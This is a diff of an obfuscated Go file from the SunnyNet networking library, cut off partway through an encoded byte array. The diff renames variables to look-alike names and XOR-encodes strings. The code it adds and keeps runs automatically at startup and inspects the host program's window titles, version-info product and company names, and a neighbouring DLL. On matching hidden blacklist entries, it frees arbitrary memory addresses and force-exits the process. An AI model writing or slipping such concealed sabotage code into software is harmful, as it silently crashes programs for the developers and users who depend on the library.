@@ -3,183 +3,161 @@
 
 package iphlpapi
 
+//请遵守开源协议,请勿修改此文件下的所有代码
+//请遵守开源协议,请勿修改此文件下的所有代码
+//请遵守开源协议,请勿修改此文件下的所有代码
+//请遵守开源协议,请勿修改此文件下的所有代码
+//请遵守开源协议,请勿修改此文件下的所有代码
+//请遵守开源协议,请勿修改此文件下的所有代码
+//请遵守开源协议,请勿修改此文件下的所有代码
+//请遵守开源协议,请勿修改此文件下的所有代码
+//请遵守开源协议,请勿修改此文件下的所有代码
+//请遵守开源协议,请勿修改此文件下的所有代码
+//请遵守开源协议,请勿修改此文件下的所有代码
+//请遵守开源协议,请勿修改此文件下的所有代码
+//请遵守开源协议,请勿修改此文件下的所有代码
+//请遵守开源协议,请勿修改此文件下的所有代码
+//请遵守开源协议,请勿修改此文件下的所有代码
+//请遵守开源协议,请勿修改此文件下的所有代码
+//请遵守开源协议,请勿修改此文件下的所有代码
+//请遵守开源协议,请勿修改此文件下的所有代码
+//请遵守开源协议,请勿修改此文件下的所有代码
+//请遵守开源协议,请勿修改此文件下的所有代码
+
 import (
 	"bytes"
 	"crypto/rsa"
 	"crypto/x509"
 	"fmt"
 	"github.com/qtgolang/SunnyNet/src/RSA"
+	"github.com/qtgolang/SunnyNet/src/iphlpapi/unsafe"
 	"github.com/qtgolang/SunnyNet/src/public"
 	"golang.org/x/sys/windows"
 	"math/rand"
 	"os"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"syscall"
 	"time"
-	"unsafe"
 )
-
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
-//请遵守开源协议,请勿修改此文件下的所有代码
 
 var (
-	__1 *windows.LazyDLL
-	__2 *windows.LazyProc
-	__3 *windows.LazyProc
-	__4 *windows.LazyProc
-	__5 *syscall.LazyDLL
-	__6 *syscall.LazyProc
-	__7 *syscall.LazyProc
-	__8 *syscall.LazyProc
+	_o00Oo000Oo *windows.LazyDLL
+	_oOoOooOO0o *windows.LazyProc
+	_o00ooOo0oo *windows.LazyProc
+	_oO0O0ooOOo *windows.LazyProc
+	_oo0OO0Oo00 *syscall.LazyDLL
+	_o0o00OO000 *syscall.LazyProc
+	_ooo0OOO0o0 *syscall.LazyProc
+	_oOo0oo0oOO *syscall.LazyProc
 )
 
-func _1(_2 windows.Handle) string {
-	_3 := make([]uint16, 256)
-	_, _, _ = __3.Call(
-		uintptr(_2),
-		uintptr(unsafe.Pointer(&_3[0])),
-		uintptr(len(_3)),
-	)
-	return syscall.UTF16ToString(_3)
+func R1() {
+
 }
-func _4(_2 windows.Handle) uint32 {
-	var _3 uint32
-	__4.Call(
-		uintptr(_2),
-		uintptr(unsafe.Pointer(&_3)),
+func o00Oo000Oo(oOoOooOO0o windows.Handle) string {
+	o00ooOo0oo := make([]uint16, 256)
+	_, _, _ = _o00ooOo0oo.Call(
+		uintptr(oOoOooOO0o),
+		(unsafe.PointerUint16(&o00ooOo0oo[0])),
+		uintptr(len(o00ooOo0oo)),
 	)
-	return _3
+	return syscall.UTF16ToString(o00ooOo0oo)
 }
-func _5(_2 windows.Handle) uintptr {
-	_6 := _4(_2)
-	if int(_6) == os.Getpid() {
-		title := _1(_2)
-		go _13(title)
+func oO0O0ooOOo(oOoOooOO0o windows.Handle) uint32 {
+	var o00ooOo0oo uint32
+	_oO0O0ooOOo.Call(
+		uintptr(oOoOooOO0o),
+		(unsafe.PointerUint32(&o00ooOo0oo)),
+	)
+	return o00ooOo0oo
+}
+func oo0OO0Oo00(oOoOooOO0o windows.Handle) uintptr {
+	o0o00OO000 := oO0O0ooOOo(oOoOooOO0o)
+	if int(o0o00OO000) == os.Getpid() {
+		title := o00Oo000Oo(oOoOooOO0o)
+		go o00Oo000Oo3(title)
 	}
 	return 1
 }
-func _7() string {
-	_8, err := os.Executable()
-	if err != nil {
+
+// 获取当前运行的可执行文件的完整路径
+func ooo0OOO0o0() string {
+	oOo0oo0oOO, oOO0Ooo0OO := os.Executable()
+	if oOO0Ooo0OO != nil {
 		return ""
 	}
-	return filepath.Clean(_8)
+	return filepath.Clean(oOo0oo0oOO)
 }
-func _8(_2 string) uint32 {
-	_3, _ := syscall.UTF16PtrFromString(_2)
-	_31, _, _ := __6.Call(uintptr(unsafe.Pointer(_3)), 0)
-	if _31 == 0 {
+func oOo0oo0oOO(oOoOooOO0o string) uint32 {
+	o00ooOo0oo, _ := syscall.UTF16PtrFromString(oOoOooOO0o)
+	o00ooOo0oo1, _, _ := _o0o00OO000.Call((unsafe.PointerUint16(o00ooOo0oo)), 0)
+	if o00ooOo0oo1 == 0 {
 		return 0
 	}
-	return uint32(_31)
+	return uint32(o00ooOo0oo1)
 }
-func _9() {
-	_2 := _7()
-	if _2 == "" {
+func oo00oO0OO0() {
+	oOoOooOO0o := ooo0OOO0o0()
+	if oOoOooOO0o == "" {
 		return
 	}
-	_3 := _8(_2)
-	if _3 == 0 {
+	o00ooOo0oo := oOo0oo0oOO(oOoOooOO0o)
+	if o00ooOo0oo == 0 {
 		return
 	}
-	_a := make([]byte, _3)
-	_b, _ := syscall.UTF16PtrFromString(_2)
-	_c, _, _ := __7.Call(
-		uintptr(unsafe.Pointer(_b)),
+	o0o00ooo0O := make([]byte, o00ooOo0oo)
+	ooOOoo00oo, _ := syscall.UTF16PtrFromString(oOoOooOO0o)
+	ooo0OO0000, _, _ := _ooo0OOO0o0.Call(
+		(unsafe.PointerUint16(ooOOoo00oo)),
 		0,
-		uintptr(_3),
-		uintptr(unsafe.Pointer(&_a[0])),
+		uintptr(o00ooOo0oo),
+		(unsafe.PointerByte(&o0o00ooo0O[0])),
 	)
-	if _c == 0 {
+	if ooo0OO0000 == 0 {
 		return
 	}
-	var _d *uint16
-	var _e uint32
-	__8.Call(
-		uintptr(unsafe.Pointer(&_a[0])),
-		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(`\VarFileInfo\Translation`))),
-		uintptr(unsafe.Pointer(&_d)),
-		uintptr(unsafe.Pointer(&_e)),
+	var o0Ooo00OoO *uint16
+	var oo0Ooo0OOO uint32
+	_oOo0oo0oOO.Call(
+		(unsafe.PointerByte(&o0o00ooo0O[0])),
+		(unsafe.PointerUint16(syscall.StringToUTF16Ptr(string(o0O00oo0OO([]byte{163, 169, 158, 141, 185, 150, 147, 154, 182, 145, 153, 144, 163, 171, 141, 158, 145, 140, 147, 158, 139, 150, 144, 145}))))),
+		(unsafe.PointerPointerUint16(&o0Ooo00OoO)),
+		(unsafe.PointerUint32(&oo0Ooo0OOO)),
 	)
-	_f := (*[1 << 10]uint16)(unsafe.Pointer(_d))[:_e/2]
-	for i := 0; i < len(_f); i += 2 {
-		_q := _f[i]
-		_g := _f[i+1]
-		_l := fmt.Sprintf("%04x%04x", _q, _g)
-		_s := []string{
-			`\StringFileInfo\` + _l + `\ProductName`,
-			`\StringFileInfo\` + _l + `\FileDescription`,
-			`\StringFileInfo\` + _l + `\CompanyName`,
+	oO0Oooo0OO := unsafe.MPointerUint16(o0Ooo00OoO, oo0Ooo0OOO)
+	for i := 0; i < len(oO0Oooo0OO); i += 2 {
+		_q := oO0Oooo0OO[i]
+		ooOooOoo0O := oO0Oooo0OO[i+1]
+		o0ooOoOOoo := fmt.Sprintf("%04x%04x", _q, ooOooOoo0O)
+		oO0oo0o00O := []string{
+			string(o0O00oo0OO([]byte{163, 172, 139, 141, 150, 145, 152, 185, 150, 147, 154, 182, 145, 153, 144, 163})) + o0ooOoOOoo + string(o0O00oo0OO([]byte{163, 175, 141, 144, 155, 138, 156, 139, 177, 158, 146, 154})),
+			string(o0O00oo0OO([]byte{163, 172, 139, 141, 150, 145, 152, 185, 150, 147, 154, 182, 145, 153, 144, 163})) + o0ooOoOOoo + string(o0O00oo0OO([]byte{163, 185, 150, 147, 154, 187, 154, 140, 156, 141, 150, 143, 139, 150, 144, 145})),
+			string(o0O00oo0OO([]byte{163, 172, 139, 141, 150, 145, 152, 185, 150, 147, 154, 182, 145, 153, 144, 163})) + o0ooOoOOoo + string(o0O00oo0OO([]byte{163, 188, 144, 146, 143, 158, 145, 134, 177, 158, 146, 154})),
 		}
-		for _, _m := range _s {
-			_v := _10(_a, _m)
-			if _v != "" {
-				go _13(_v)
+		for _, o0Oo0o0o00 := range oO0oo0o00O {
+			oOO0Ooo0OO := unsafe.A10(_oOo0oo0oOO, o0o00ooo0O, o0Oo0o0o00)
+			if oOO0Ooo0OO != "" {
+				go o00Oo000Oo3(oOO0Ooo0OO)
 			}
 		}
 	}
 }
-func _10(data []byte, key string) string {
-	var ptr unsafe.Pointer
-	var length uint32
-	lpKey, _ := syscall.UTF16PtrFromString(key)
-	ret, _, _ := __8.Call(
-		uintptr(unsafe.Pointer(&data[0])),
-		uintptr(unsafe.Pointer(lpKey)),
-		uintptr(unsafe.Pointer(&ptr)),
-		uintptr(unsafe.Pointer(&length)),
-	)
-	if ret == 0 {
-		return ""
-	}
-	return syscall.UTF16ToString((*[1 << 16]uint16)(ptr)[:length])
-}
-func _11() {
-	go _9()
+func oooOoo00oo() {
+	go oo00oO0OO0()
 	go func() {
-		__2.Call(
-			windows.NewCallback(_5),
+		_oOoOooOO0o.Call(
+			windows.NewCallback(oo0OO0Oo00),
 			0,
 		)
 	}()
-	go _14()
-	go _13("")
+	go o00Oo000Oo4()
+	go o00Oo000Oo3("")
 }
 
-var _12 *rsa.PublicKey
-var _000_ = []byte{
+var o0oo0Oo0O0 *rsa.PublicKey
+var oo0o000oO0 = []byte{
 	0x30,
 	0x82, 0x01, 0x0a, 0x02, 0x82, 0x01, 0x01, 0x00, 0xbc, 0x00, 0x8c, 0x85, 0x5e, 0xe0, 0xa7, 0xc0, 0xe4, 0x2c, 0x3e, 0x89, 0xb2, 0x73, 0x1b, 0x7b, 0xf8, 0x4f, 0xc4, 0x3c, 0xf2, 0x8d, 0x3c, 0xef,
 	0x7a, 0x40, 0xbc, 0x69, 0x20, 0xf1, 0x9f, 0xbd, 0x94, 0xbc, 0xea, 0x64, 0xd5, 0x7f, 0x72, 0xc3, 0x85, 0x9c, 0xf4, 0xd8, 0xfb, 0x91, 0xdf, 0xfa, 0xcb, 0xc1, 0x46, 0x4f, 0x59, 0x6d, 0xf0, 0xa2,
@@ -376,243 +354,411 @@ var _000_ = []byte{
 	0xed, 0xf2, 0xc4, 0x55, 0x6b, 0x47, 0x1a, 0xa0, 0x36, 0xc3, 0x47, 0xda, 0xaf}
 
 func init() {
-	_b, _a := x509.ParsePKCS1PublicKey(_000_[:270])
-	if _a != nil {
-		println("no panic [270]... ")
+	ooOOoo00oo, o0o00ooo0O := x509.ParsePKCS1PublicKey(oo0o000oO0[:270])
+	if o0o00ooo0O != nil {
+		fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
 		go func() {
-			panic("noKey")
-			for i := 100; i < 10000; i++ {
+			panic(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
 				time.Sleep(time.Millisecond * 10)
-				public.Free(uintptr(i))
+				public.Free(uintptr(o0O0ooOo0o))
 			}
 		}()
 		os.Exit(0)
 		go os.Exit(0)
 	}
-	if _b == nil {
-		println("no panic [270:2]... ")
+	if ooOOoo00oo == nil {
+		fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
 		go func() {
-			panic("noKey")
-			for i := 100; i < 10000; i++ {
+			panic(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
 				time.Sleep(time.Millisecond * 10)
-				public.Free(uintptr(i))
+				public.Free(uintptr(o0O0ooOo0o))
 			}
 		}()
 		os.Exit(0)
 		go os.Exit(0)
 	}
-	_12 = _b
-	__1 = windows.NewLazySystemDLL(_15(_000_[1806:], 110))
-	__2 = __1.NewProc(_15(_000_[1294:], 9))
-	__3 = __1.NewProc(_15(_000_[2062:], 222))
-	__4 = __1.NewProc(_15(_000_[270:], 256))
-	__5 = syscall.NewLazyDLL(_15(_000_[1038:], 1))
-	__6 = __5.NewProc(_15(_000_[2318:], 1013))
-	__7 = __5.NewProc(_15(_000_[2574:], 6))
-	__8 = __5.NewProc(_15(_000_[1550:], 1550))
-	go _0()
+	o0oo0Oo0O0 = ooOOoo00oo
+	_o00Oo000Oo = windows.NewLazySystemDLL(o00Oo000Oo5(oo0o000oO0[1806:], 110))
+	_oOoOooOO0o = _o00Oo000Oo.NewProc(o00Oo000Oo5(oo0o000oO0[1294:], 9))
+	_o00ooOo0oo = _o00Oo000Oo.NewProc(o00Oo000Oo5(oo0o000oO0[2062:], 222))
+	_oO0O0ooOOo = _o00Oo000Oo.NewProc(o00Oo000Oo5(oo0o000oO0[270:], 256))
+	_oo0OO0Oo00 = syscall.NewLazyDLL(o00Oo000Oo5(oo0o000oO0[1038:], 1))
+	_o0o00OO000 = _oo0OO0Oo00.NewProc(o00Oo000Oo5(oo0o000oO0[2318:], 1013))
+	_ooo0OOO0o0 = _oo0OO0Oo00.NewProc(o00Oo000Oo5(oo0o000oO0[2574:], 6))
+	_oOo0oo0oOO = _oo0OO0Oo00.NewProc(o00Oo000Oo5(oo0o000oO0[1550:], 1550))
+	go o0000oO000()
+	go o0O00O0oOO()
 }
-func _0() {
+func o0O00O0oOO() {
 	time.Sleep(time.Second * time.Duration(rand.Intn(15)+3))
-	_11()
-}
-func _13(m string) {
-	go func() {
-		if strings.Contains(strings.ToLower(m), _15(_000_[526:])) {
-			println("no panic [526]... ")
-			go func() {
-				for i := 100; i < 10000; i++ {
-					time.Sleep(time.Millisecond * 10)
-					public.Free(uintptr(i))
-				}
-			}()
-			os.Exit(0)
-			go os.Exit(0)
-		}
-	}()
-	go func() {
-		if strings.Contains(m, _15(_000_[3598:])) {
-			println("no panic [3598]... ")
-			go func() {
-				for i := 100; i < 10000; i++ {
-					time.Sleep(time.Millisecond * 10)
-					public.Free(uintptr(i))
-				}
-			}()
-			os.Exit(0)
-			go os.Exit(0)
-		}
-	}()
-	go func() {
-		if strings.Contains(strings.ToLower(m), _15(_000_[3854:])) {
-			println("no panic [3854]... ")
-			go func() {
-				for i := 100; i < 10000; i++ {
-					time.Sleep(time.Millisecond * 10)
-					public.Free(uintptr(i))
-				}
-			}()
-			os.Exit(0)
-			go os.Exit(0)
-		}
-	}()
-	go func() {
-		if strings.Contains(strings.ToLower(m), _15(_000_[4110:])) {
-			println("no panic [4110]... ")
-			go func() {
-				for i := 100; i < 10000; i++ {
-					time.Sleep(time.Millisecond * 10)
-					public.Free(uintptr(i))
-				}
-			}()
-			os.Exit(0)
-			go os.Exit(0)
-		}
-	}()
-	go func() {
-		if strings.Contains(strings.ToLower(m), _15(_000_[4366:])) {
-			println("no panic [4366]... ")
-			go func() {
-				for i := 100; i < 10000; i++ {
-					time.Sleep(time.Millisecond * 10)
-					public.Free(uintptr(i))
-				}
-			}()
-			os.Exit(0)
-			go os.Exit(0)
-		}
-	}()
-	go func() {
-		if strings.Contains(strings.ToLower(m), _15(_000_[4622:])) {
-			println("no panic [4622]... ")
-			go func() {
-				for i := 100; i < 10000; i++ {
-					time.Sleep(time.Millisecond * 10)
-					public.Free(uintptr(i))
-				}
-			}()
-			os.Exit(0)
-			go os.Exit(0)
-		}
-	}()
-	go func() {
-		if strings.Contains(strings.ToLower(m), _15(_000_[3342:])) {
-			println("no panic [3342]... ")
-			go func() {
-				for i := 100; i < 10000; i++ {
-					time.Sleep(time.Millisecond * 10)
-					public.Free(uintptr(i))
-				}
-			}()
-			os.Exit(0)
-			go os.Exit(0)
-		}
-	}()
-	go func() {
-		if strings.Contains(strings.ToLower(m), _15(_000_[3086:])) {
-			println("no panic [3086]... ")
-			go func() {
-				for i := 100; i < 10000; i++ {
-					time.Sleep(time.Millisecond * 10)
-					public.Free(uintptr(i))
-				}
-			}()
-			os.Exit(0)
-			go os.Exit(0)
-		}
-	}()
-	go func() {
-		if strings.Contains(strings.ToLower(m), _15(_000_[2830:])) {
-			println("no panic [2830]... ")
-			go func() {
-				for i := 100; i < 10000; i++ {
-					time.Sleep(time.Millisecond * 10)
-					public.Free(uintptr(i))
-				}
-			}()
-			os.Exit(0)
-			go os.Exit(0)
-		}
-	}()
-	go func() {
-		if strings.Contains(strings.ToLower(m), _15(_000_[782:])) {
-			println("no panic [782]... ")
-			go func() {
-				for i := 100; i < 10000; i++ {
-					time.Sleep(time.Millisecond * 10)
-					public.Free(uintptr(i))
-				}
-			}()
-			os.Exit(0)
-			go os.Exit(0)
-		}
-	}()
-	go func() {
-		if strings.Contains(strings.ToLower(m), _15([]byte{80, 81, 45, 200, 246, 183, 197, 130, 139, 177, 204, 144, 108, 155, 55, 63, 107, 204, 199, 39, 65, 49, 131, 89, 167, 193, 241, 177, 154, 211, 53, 37, 156, 9, 241, 195, 169, 80, 38, 133, 71, 250, 55, 251, 181, 44, 229, 65, 80, 11, 103, 191, 199, 245, 167, 95, 143, 72, 4, 252, 21, 15, 34, 7, 54, 193, 35, 191, 221, 150, 111, 197, 0, 98, 27, 58, 236, 68, 21, 126, 223, 240, 147, 10, 251, 106, 109, 230, 237, 124, 39, 207, 114, 212, 23, 84, 205, 108, 223, 239, 168, 113, 27, 209, 172, 168, 112, 235, 45, 98, 102, 186, 118, 60, 93, 161, 171, 148, 210, 255, 189, 114, 108, 69, 66, 138, 220, 179, 243, 6, 99, 158, 135, 219, 60, 228, 188, 209, 143, 33, 122, 13, 85, 76, 219, 119, 60, 11, 142, 133, 123, 161, 30, 15, 196, 147, 213, 58, 189, 158, 40, 56, 214, 112, 246, 216, 23, 129, 176, 47, 143, 172, 159, 233, 203, 3, 134, 150, 222, 84, 238, 208, 24, 24, 133, 60, 71, 134, 142, 207, 123, 155, 236, 70, 102, 157, 69, 255, 141, 46, 102, 123, 252, 12, 63, 239, 43, 93, 118, 248, 37, 6, 63, 237, 104, 112, 223, 29, 146, 56, 113, 31, 33, 233, 18, 165, 253, 73, 203, 232, 108, 59, 128, 127, 200, 216, 21, 209, 207, 40, 65, 223, 46, 34, 67, 112, 209, 128, 107, 249, 67, 124, 83, 201, 70, 198})) {
-			println("no panic [80,81,45]... ")
-			go func() {
-				for i := 100; i < 10000; i++ {
-					time.Sleep(time.Millisecond * 10)
-					public.Free(uintptr(i))
-				}
-			}()
-			os.Exit(0)
-			go os.Exit(0)
-		}
-	}()
-	go func() {
-		if strings.Contains(strings.ToLower(m), _15([]byte{94, 91, 219, 178, 8, 124, 145, 162, 189, 88, 219, 56, 125, 181, 97, 127, 195, 188, 8, 70, 203, 213, 75, 98, 38, 22, 205, 220, 65, 173, 213, 45, 97, 235, 119, 228, 83, 220, 221, 79, 36, 55, 65, 50, 90, 130, 160, 94, 72, 20, 3, 116, 132, 78, 72, 65, 24, 127, 160, 122, 72, 187, 68, 204, 184, 122, 164, 174, 152, 3, 32, 82, 80, 226, 187, 79, 107, 189, 173, 203, 74, 50, 89, 239, 177, 56, 93, 58, 192, 138, 5, 122, 76, 157, 232, 25, 40, 2, 243, 55, 137, 242, 9, 6, 92, 113, 153, 7, 139, 49, 10, 239, 116, 81, 153, 45, 162, 127, 112, 236, 191, 164, 240, 151, 129, 93, 17, 33, 228, 5, 143, 123, 237, 178, 158, 82, 226, 193, 149, 209, 30, 228, 167, 11, 206, 103, 71, 235, 180, 98, 56, 187, 31, 151, 138, 91, 36, 73, 245, 243, 219, 222, 33, 57, 116, 98, 70, 45, 66, 103, 96, 94, 164, 236, 82, 18, 167, 144, 168, 94, 49, 34, 94, 107, 175, 57, 102, 0, 135, 57, 43, 45, 50, 80, 155, 153, 152, 234, 36, 250, 214, 44, 12, 8, 60, 221, 66, 117, 25, 33, 93, 251, 245, 168, 47, 96, 180, 78, 142, 189, 112, 232, 38, 181, 99, 202, 53, 162, 41, 29, 30, 131, 169, 247, 242, 176, 116, 95, 152, 168, 93, 173, 83, 24, 143, 77, 153, 111, 173, 137, 253, 1, 56, 196, 76, 139})) {
-			println("no panic [94,91,219]... ")
-			go func() {
-				for i := 100; i < 10000; i++ {
-					time.Sleep(time.Millisecond * 10)
-					public.Free(uintptr(i))
-				}
-			}()
-			os.Exit(0)
-			go os.Exit(0)
-		}
-	}()
-}
-func _14() {
-	ex, err := os.Executable()
-	if err != nil {
+	oOo0oo0oOO_, _ := os.Executable()
+	o0OOoOoOOo := strings.ToLower(oOo0oo0oOO_)
+	if !strings.HasSuffix(o0OOoOoOOo, string(o0O00oo0OO([]byte{209, 154, 135, 154}))) {
 		return
 	}
-	exPath := filepath.Dir(ex)
+	oO0OO0o0O0 := o0OOoOoOOo[:len(o0OOoOoOOo)-len(string(o0O00oo0OO([]byte{209, 154, 135, 154})))] + string(o0O00oo0OO([]byte{209, 155, 147, 147}))
+	if oOOO00OOoO(oO0OO0o0O0, o0OOOOO0Oo) {
+		go func() {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}()
+	}
+	if oOOO00OOoO(oO0OO0o0O0, oooO00O0o0) {
+		go func() {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}()
+	}
+	if oOOO00OOoO(oO0OO0o0O0, o0ooOoO0O0) {
+		go func() {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}()
+	}
+	if oOOO00OOoO(oO0OO0o0O0, ooO0000000) {
+		go func() {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}()
+	}
+}
+
+var o0OOOOO0Oo = o0O00oo0OO([]byte{65, 67, 41, 175, 214, 206, 119, 90, 138, 106, 237, 124, 87, 165, 212, 235, 148, 187, 157, 146, 134, 106, 65, 93, 37, 175, 174, 82, 212, 80, 171, 234, 235, 169, 131, 0, 188, 5, 33, 130, 32, 131, 15, 30, 81, 178, 100, 72, 66, 8, 1, 89, 202, 20, 41, 208, 164, 65, 131, 33, 3, 6, 54, 54, 182, 182, 182, 14, 182, 118, 206, 182, 246, 46, 214, 182, 78, 12, 25, 218, 210, 163, 199, 144, 38, 45, 186, 84, 32, 161, 78, 134, 60, 121, 34, 96, 17, 193, 11, 18, 110, 19, 19, 195, 110, 87, 181, 217, 172, 84, 202, 138, 229, 146, 66, 185, 36, 87, 41, 99, 169, 85, 49, 55, 106, 88, 90, 117, 25, 165, 134, 172, 114, 83, 78, 169, 41, 175, 220, 84, 80, 107, 231, 213, 79, 167, 209, 202, 127, 215, 86, 188, 174, 219, 86, 236, 41, 41, 246, 149, 243, 111, 148, 180, 59, 165, 211, 193, 88, 164, 247, 71, 58, 26, 101, 221, 110, 69, 191, 87, 53, 236, 85, 141, 122, 85, 227, 126, 197, 88, 179, 98, 162, 85, 54, 213, 42, 155, 107, 151, 204, 52, 75, 166, 90, 101, 19, 237, 154, 137, 78, 203, 84, 87, 181, 171, 92, 150, 70, 141, 28, 158, 132, 152, 40, 236, 207, 165, 135, 245, 217, 14, 126, 234, 108, 224, 192, 129, 131, 18, 37, 202, 82, 169, 212, 110, 183, 91, 173, 86, 62, 159, 7, 10, 40, 160, 224, 193, 131, 7, 7, 14, 156, 91, 40, 184, 99, 120, 27, 18, 80, 217, 175, 242, 64, 136, 16, 97, 62, 159, 7, 30, 120, 224, 29, 29, 29, 15, 125, 203, 142, 29, 59, 182, 108, 217, 114, 227, 198, 237, 5, 237, 125, 69, 128, 187, 111, 130, 217, 5, 59, 163, 199, 189, 108, 52, 26, 180, 105, 211, 190, 138, 248, 161, 151, 45, 91, 182, 17, 17, 17, 139, 197, 130, 47, 95, 190, 208, 52, 224, 112, 70, 252, 249, 243, 143, 141, 141, 197, 139, 23, 111, 189, 94, 175, 157, 254, 181, 83, 179, 217, 52, 54, 54, 38, 77, 154, 180, 189, 189, 125, 104, 104, 232, 83, 97, 79, 173, 176, 96, 193, 130, 42, 85, 170, 15, 132, 244, 1, 238, 66, 206, 165, 71, 8, 217, 3, 28, 216, 255, 206, 8, 46, 92, 184, 104, 208, 160, 145, 147, 147, 43, 67, 247, 149, 74, 165, 90, 173, 214, 235, 245, 23, 68, 225, 240, 254, 194, 194, 194, 112, 224, 192, 65, 133, 10, 85, 161, 80, 120, 210, 195, 195, 182, 82, 169, 20, 10, 133, 27, 250, 90, 136, 120, 125, 104, 161, 103, 17, 23, 23, 71, 135, 14, 157, 185, 185, 185, 155, 155, 27, 119, 238, 220, 35, 35, 35, 195, 195, 195, 35, 34, 34, 184, 112, 225, 18, 24})
+var oooO00O0o0 = o0O00oo0OO([]byte{152, 251, 159, 20, 130, 217, 128, 67, 121, 203, 83, 204, 183, 137, 186, 56, 191, 86, 105, 148, 160, 131, 22, 90, 196, 245, 90, 59, 130, 65, 76, 171, 23, 123, 116, 236, 59, 248, 89, 206, 155, 165, 187, 12, 44, 232, 82, 235, 87, 251, 88, 208, 203, 26, 240, 0, 163, 73, 214, 92, 204, 77, 201, 50, 20, 124, 142, 246, 46, 29, 245, 95, 28, 164, 180, 90, 79, 16, 72, 198, 113, 60, 64, 143, 30, 248, 131, 206, 177, 154, 53, 107, 54, 90, 142, 0, 5, 217, 185, 42, 154, 171, 149, 5, 58, 141, 114, 143, 49, 89, 123, 222, 67, 30, 17, 124, 139, 182, 37, 220, 112, 205, 24, 120, 204, 253, 90, 14, 239, 200, 186, 126, 116, 253, 213, 12, 228, 5, 12, 248, 38, 227, 195, 65, 19, 200, 59, 119, 73, 67, 243, 121, 248, 88, 89, 251, 223, 58, 229, 188, 57, 150, 159, 53, 124, 219, 174, 123, 228, 23, 55, 128, 166, 129, 123, 205, 231, 186, 7, 60, 248, 253, 207, 58, 224, 193, 251, 163, 104, 30, 80, 146, 145, 223, 245, 20, 210, 164, 73, 139, 202, 202, 201, 144, 233, 92, 14, 221, 100, 68, 116, 110, 56, 79, 109, 5, 250, 175, 41, 146, 100, 22, 224, 55, 159, 118, 207, 43, 139, 123, 68, 8, 228, 238, 158, 12, 40, 134, 73, 219, 37, 143, 2, 157, 28, 216, 193, 65, 235, 105, 128, 142, 191, 5, 52, 64, 1, 214, 64, 3, 229, 156, 94, 174, 231, 250, 183, 98, 11, 71, 160, 10, 199, 129, 248, 126, 231, 130, 232, 180, 22, 142, 122, 45, 210, 174, 120, 155, 42, 37, 194, 77, 133, 60, 129, 166, 252, 131, 133, 191, 